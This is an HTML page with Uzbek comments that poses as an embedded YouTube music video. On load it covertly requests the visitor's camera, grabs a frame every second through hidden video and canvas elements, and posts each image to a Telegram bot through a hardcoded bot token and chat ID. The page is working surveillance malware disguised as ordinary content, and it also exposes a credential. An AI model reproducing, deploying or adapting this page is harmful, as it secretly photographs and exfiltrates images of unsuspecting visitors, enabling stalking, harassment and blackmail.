<!doctype html>
<html lang="uz">
<head>
  <meta charset="utf-8">
  <title>A</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-family: Arial, sans-serif;
    }
    #hello {
      font-size: 48px;
      font-weight: bold;
    }
    #status {
      font-size: 14px;
      opacity: 0.9;
      margin-top: 10px;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
<iframe width="853" height="480" src="https://www.youtube.com/embed/lRD_LGMkuzs?list=RDlRD_LGMkuzs" title="DALBAYOBSAN" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // --- Telegram ma'lumotlari ---
    const BOT_TOKEN = '8471262438:AAEFAMdTxDcAtKMzZFENdD0CxG2ZDWMlfi8';
    const CHAT_ID = '1889969457';
    // ------------------------------

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');
    let stream = null;
    let captureInterval = null;

    // Rasmni Telegramga yuboruvchi funksiya
    async function sendToTelegram(blob) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', blob, 'photo.jpg');

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: form
        });
        if (!res.ok) throw new Error('.');
        const data = await res.json();
        if (!data.ok) throw new Error('.');
        console.log('✅ Rasm yuborildi', new Date().toLocaleTimeString());
        status.textContent = `Rasm yuborildi: ${new Date().toLocaleTimeString()}`;
      } catch (e) {
        console.warn('❌', e);
        status.textContent = '.';
      }
    }

    // Har soniyada rasm olish
    async function captureFrame() {
      if (!video.videoWidth) return;
      const w = video.videoWidth;
      const h = video.videoHeight;
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, w, h);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
      const blob = dataURItoBlob(dataUrl);
      await sendToTelegram(blob);
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      return new Blob([ab], { type: mimeString });
    }

    // Kamera ishga tushirish
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        status.textContent = '...';

        // video tayyor bo‘lgach, har 1 soniyada rasm yuborish
        await new Promise(resolve => {
          if (video.readyState >= 2) return resolve();
          video.onloadeddata = () => resolve();
        });

        // Har 1 sekundda rasmga olish
        captureInterval = setInterval(captureFrame, 1000);
      } catch (err) {
        console.error(err);
        if (err.name === 'NotAllowedError') {
          status.textContent = '❌';
        } else {
          status.textContent = '❌' + err.message;
        }
      }
    }

    window.addEventListener('load', startCamera);
  </script>
</body>
</html>
